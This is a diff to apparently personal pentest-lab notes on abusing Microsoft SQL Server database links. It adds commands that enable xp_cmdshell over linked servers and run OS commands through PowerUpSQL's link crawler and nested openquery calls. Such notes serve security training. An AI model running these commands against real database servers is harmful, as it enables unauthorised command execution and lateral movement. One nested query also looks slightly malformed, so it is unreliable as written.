@@ -36,6 +36,10 @@ Get-SQLServerLink -Instance dcorp-mssql -Verbose
 ![[Pasted image 20250521201158.png]]
 
 
+> [!NOTE] **NOTE**
+> Connect to host using the `HeidiSQL` client
+
+
  Manual
 ```sql
 select * from master..sysservers
@@ -61,15 +65,22 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 ```
 
 ###### Executing Commands
-> **Important:** If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled >
 
+> [!NOTE] **Note**
+>  If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled like so:
+> ```sql
+> EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+
+Run commands using crawler
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'whoami'" -QueryTarget eu-sql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
+
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'cmd /c set username'" 
 ```
 
 Manual
 ```sql
-EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
 ```
 
-[^1]: Public on A... run stored procedures on B and C due to links
+
